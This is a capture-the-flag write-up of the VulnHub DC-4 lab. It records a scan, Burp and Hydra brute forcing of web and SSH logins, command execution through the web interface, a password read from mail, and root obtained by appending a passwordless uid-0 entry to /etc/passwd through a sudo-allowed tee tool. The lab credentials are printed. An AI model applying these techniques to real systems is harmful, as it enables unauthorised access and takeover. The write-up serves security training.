DC4

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Brute Force web login password
[+] Execute commands on the server from UI
[+] Hydra brute force login credentials
[+] Privilege Escalation abusing SUDO rights -  teehee ---ading setrus in /etc/passwd
"setrus::0:0:::/bin/bash"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Host is up (0.00066s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
80/tcp open  http    nginx 1.15.10
|_http-server-header: nginx/1.15.10
|_http-title: System Tools
MAC Address: 08:00:27:B3:AB:48 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Browsing to http://192.168.56.109 we found a login page

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/DC4/dc41.png)

Burp Intruder with username : admin
password :  rockyou.txt

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/DC4/dc42.png)

We can execute command on the server from the web application

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/DC4/dc43.png)

After browsing the server we found a password backup for user jim

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/DC4/dc44.png)


All this passwords have been put in a file.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# hydra -l jim -P passwords ssh://192.168.56.109
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-10-25 09:47:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 251 login tries (l:1/p:251), ~16 tries per task
[DATA] attacking ssh://192.168.56.109:22/
[STATUS] 179.00 tries/min, 179 tries in 00:01h, 75 to do in 00:01h, 16 active
[22][ssh] host: 192.168.56.109   login: jim   password: jibril04
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-10-25 09:49:07

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Username : jim
Password : jibril04


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh jim@192.168.56.109
jim@192.168.56.109's password: 
Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100
jim@dc-4:~$ id;whoami
uid=1002(jim) gid=1002(jim) groups=1002(jim)
jim

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
jim@dc-4:~$ find / -user charles 2>/dev/null
/home/charles
/home/charles/.profile
/home/charles/.bashrc
/home/charles/.bash_logout
You have new mail in /var/mail/jim
jim@dc-4:/var/mail$ cat jim 
From charles@dc-4 Sat Apr 06 21:15:46 2019
Return-path: <charles@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
Received: from charles by dc-4 with local (Exim 4.89)
	(envelope-from <charles@dc-4>)
	id 1hCjIX-0000kO-Qt
	for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
To: jim@dc-4
Subject: Holidays
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
From: Charles <charles@dc-4>
Date: Sat, 06 Apr 2019 21:15:45 +1000
Status: O

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charles


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Logging in as Charles

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
jim@dc-4:/var/mail$ su charles
Password: 
charles@dc-4:/var/mail$ id
uid=1001(charles) gid=1001(charles) groups=1001(charles)
charles@dc-4:/var/mail$ sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
charles@dc-4:/var/mail$ echo "setrus::0:0:::/bin/bash" | sudo /usr/bin/teehee -a /etc/passwd
setrus::0:0:::/bin/bash
charles@dc-4:/var/mail$ su setrus
root@dc-4:/var/mail# id
uid=0(root) gid=0(root) groups=0(root)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~





